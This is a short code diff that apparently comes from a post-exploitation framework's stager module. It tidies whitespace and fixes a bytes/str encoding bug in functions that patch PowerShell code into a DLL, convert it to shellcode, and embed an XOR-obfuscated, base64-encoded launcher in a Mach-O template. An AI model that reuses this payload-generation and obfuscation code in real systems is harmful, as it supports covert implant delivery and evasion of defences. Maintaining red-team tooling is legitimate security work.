@@ -153,7 +153,7 @@ class Stagers(object):
 
             dllRaw = ''
             with open(origPath, 'rb') as f:
-                dllRaw = f.read() 
+                dllRaw = f.read()
 
                 replacementCode = helpers.decode_base64(poshCode)
                 # patch the dll with the new PowerShell code
@@ -163,14 +163,14 @@ class Stagers(object):
 
                 flags = 0
                 flags |= 0x1
-                
+
                 sc = ConvertToShellcode(dllPatched)
 
                 return sc
-        
+
         else:
             print(helpers.color("[!] Original .dll for arch {} does not exist!".format(arch)))
-                
+
 
 
     def generate_macho(self, launcherCode):
@@ -207,8 +207,8 @@ class Stagers(object):
 
             key = 'subF'
             launcherCode = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(launcherCode, cycle(key)))
-            launcherCode = base64.urlsafe_b64encode(launcherCode)
-            launcher = launcherCode.encode('utf-8') + b'\x00' * (placeHolderSz - len(launcherCode))
+            launcherCode = base64.urlsafe_b64encode(launcherCode.encode('utf-8'))
+            launcher = launcherCode + b'\x00' * (placeHolderSz - len(launcherCode))
             patchedMachO = template[:offset]+launcher+template[(offset+len(launcher)):]
 
             return patchedMachO
